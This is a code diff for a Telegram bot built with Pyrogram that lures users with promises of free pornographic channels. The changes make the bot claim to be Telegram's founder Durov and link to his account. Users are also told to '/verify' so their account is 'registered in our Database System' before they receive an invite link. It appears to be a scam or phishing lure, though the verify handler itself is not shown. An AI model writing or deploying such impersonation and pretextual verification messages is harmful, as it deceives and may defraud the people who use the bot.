@@ -30,11 +30,12 @@ app = pyrogram.Client(
 
 # START YA INI JINK !
 
-START_MESSAGE = """👋🏻 Hello, Introduce Me There Is a Bot For You To Get Viral Content Premium Porn Channels
+START_MESSAGE = """🙌🏻 Hello Welcome To My Bot
+Introducing Me is Durov I Have I Can Help you To Enjoy Porn Channels
 
-Please press :
+Please press : Click on the Link Below ⇙
 
-👉🏻 /JoinChannels to get your free Koleksi Porn channel
+➥ /GetChannel to get your free Koleksi Porn channel
 
 ―――――――――――――――――――
 [ ⚠️ ] Leave this bot when you don't believe Thanks.
@@ -42,6 +43,7 @@ Please press :
 [ 🔞 ] This Channel Contains Pornographic Content, if you are not old enough please leave this Bot
 
 ⁉️ __Please don't spam bots. Everything is processed according to the queue. When you spam bots, you will be back in the original queue!__
+Thoughts from the Product Manager / CEO / Founder of Telegram. t.me/durov
 """
 
 START_BUTTON = [
@@ -63,21 +65,22 @@ async def start(_, message):
 # FREEPORN HANDLER 
 
 FREE_MESSAGE = """
-⚠️ To access the Channel below, please Verify yourself first, 
-so that your account is registered in this bot database
+⚠️ To access the Channel below please Verify yourself first,
+so that your account is registered in our Database System.
 
 Please press : /verify to verify your account to bot database
 
-❓if you dont understand please type /help
+❔ If you Need help
+I have made a tutorial in the form of a video you just need to press /help
 """
 
 FREE_BUTTON = [
             [
-                InlineKeyboardButton(" KOLEKSI VIRAL ♥️", url="https://t.me/+NDFAuijydK45OWI9"),
+                InlineKeyboardButton(" Hottest Channels❤️‍🔥 ", url="https://t.me/+NDFAuijydK45OWI9"),
             ],
         ]
 
-@app.on_message(filters.command("JoinChannels") & filters.private)
+@app.on_message(filters.command("GetChannel") & filters.private)
 async def free(_, message):
     text = FREE_MESSAGE
     reply_markup = InlineKeyboardMarkup(FREE_BUTTON)
